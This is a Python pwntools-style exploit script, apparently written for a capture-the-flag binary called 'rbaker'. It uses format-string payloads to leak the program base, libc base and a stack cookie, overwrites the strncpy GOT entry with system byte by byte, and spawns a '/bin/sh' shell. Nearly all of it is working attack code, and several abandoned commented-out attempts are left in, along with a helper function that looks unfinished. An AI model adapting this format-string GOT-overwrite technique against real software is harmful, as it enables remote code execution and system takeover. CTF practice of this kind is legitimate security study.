#!/usr/bin/env python
# coding:utf-8

from ctf import *

# context.log_level = 'debug'

io = remote('0.0.0.0', 4000)
# io = process('./rbaker')

elf = ELF('./rbaker')
libc = ELF('./libc.so.6')

def check_profile():
    io.sendlineafter('[+]What do you wanna do?', 5)

def add_profile(address, phone, name):
    io.sendlineafter('[+]What do you wanna do?', 6)
    io.sendline(address)
    io.sendline('y')
    io.sendline(phone)
    io.sendline('y')
    io.sendline(name)
    io.sendline('y')

# 1 -> address, 2 -> phone, 3 -> name
def edit_profile(edit_type, s):
    io.sendlineafter('[+]What do you wanna do?', 6)
    io.sendline(edit_type)
    io.sendline(len(s) + 1)
    io.send(s)

def FILL_8(payload, last, aim, pos):
    now = aim
    if (now != last):
        if (now < last):
            now += 0x100
        payload += '%1$' + str(now - last) + 'c'
        last = now & 0xff
    payload += '%' + str(pos) + '$hhn'
    return payload, last

def ar_write(address, value):
    payload, last = '', 0
    suffix = ''
    for i in xrange(8):
        payload, last = FILL_8(payload, last, value & 0xff, 40 + i)
        suffix += p64(address + i)
        value >>= 8
    payload = ljust(payload, 0x100) #+ suffix

    payload = payload.replace('%', '=')
    print payload
    io.interactive()
    edit_profile(1, payload)
    check_profile()

# buf start = 8, 75 => ret, 79 => ret, 68 -> 74 -> 78 rbp chain
# rbp 0xd99
payload = '/bin/sh;#=%8$llx=%74$llx=%75$llx=%79$llx=%73$llx=%68$llx=%78$llx=%74$llx='
# payload = ljust(payload, 0x1fe)
add_profile(payload, '=', '=')
check_profile()
io.recvline_startswith('[+]')
io.recvuntil('=')
io.recvuntil('=', drop=True)
rbp = int(io.recvuntil('=', drop=True), 16)
prog_base = int(io.recvuntil('=', drop=True), 16) - 0xd99
libc_base = int(io.recvuntil('=', drop=True), 16) - 0x0000000000021B45 #0xc74b45 # xxx
cookie = unhex(io.recvuntil('=', drop=True))
log.info('program base address: {:#x}'.format(prog_base))
log.info('libc base address: {:#x}'.format(libc_base))
system_addr = libc_base + libc.symbols['system']
log.info('system address: {:#x}'.format(system_addr))

address = 0x00000000002030C8 + prog_base
# print hex(address)
for i in xrange(7, -1, -1):
    edit_profile(1, '%{}c%68$hhn'.format((rbp & 0xff) + i))
    check_profile()
    edit_profile(1, '%{}c%74$hhn'.format(((address >> (8 * i)) & 0xff) + 0x100))
    check_profile()
    # io.recvuntil('=4')
    # print io.recvline()
    # print '%{}c%68$hhn'.format((rbp & 0xff) + i), '%{}c%74$hhn'.format((address >> (8 * i)) & 0xff)

printf_got_addr = prog_base + elf.got['strncpy']
payload = ljust('/bin/sh;#', 32)
payload += p64(printf_got_addr)
edit_profile(3, payload)
check_profile()
io.recvline_startswith('[+]So, we will send it to:')
# leak_printf = io.recvline(keepends=False)
# io.unrecv(leak_printf)
buf = io.recvuntil('/bin/sh', drop=True)

edit_profile(3, '/bin/sh;#%{}c%78$hhn'.format(0x100 - len(buf) - 9))
check_profile()

add_profile(p64(system_addr), '', '')
io.clean()
# edit_profile(1, ljust('%78$lln', 0x10))
# check_profile()

io.interactive()
# log.info('hex cookie: {}'.format(enhex(cookie)))
#
# printf_got_addr = prog_base + elf.got['printf']
# log.info('printf got address: {:#x}'.format(printf_got_addr))
# payload = ljust('/bin/sh;#', 32)
# payload += p64(printf_got_addr)
# edit_profile(3, payload)

# edit_profile(1, p64(system_addr)
# check_profile()

# payload = cyclic(7)
# payload += cookie
# payload += pack(system_addr, 'all')
# edit_profile(3, payload)
# check_profile()


# io.interactive()
# payload = '%1122867c%16$naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamap0 '
# edit_profile(1, payload)

# atoi_got_addr = prog_base + elf.got['printf']
# log.info('atoi got address: {:#x}'.format(atoi_got_addr))
# payload = '%{}c%74$n'.format(atoi_got_addr)
# edit_profile(1, payload)
# check_profile()
#
# raw_input()
#
# check_profile()
#
# raw_input()
#
# system_addr = libc_base + libc.symbols['system']
# log.info('system address: {:#x}'.format(system_addr & 0xffffff))
# payload = '%{}c%78$n=========='.format(0x99)#system_addr & 0xffffff)
# edit_profile(1, payload)
# check_profile()





# edit_profile(1, '/bin/sh;#')
# check_profile()

# log.info('atoi got address: {:#x}'.format(atoi_got_addr))
# payload = '%{}c%11$x'.format(0x112233)
# edit_profile(1, payload)

# payload = cyclic(7)
# payload += pack(atoi_got_addr, 'all')
# edit_profile(3, payload)
# check_profile()
# ar_write(atoi_got_addr, 0x11223344)

# io.interactive()
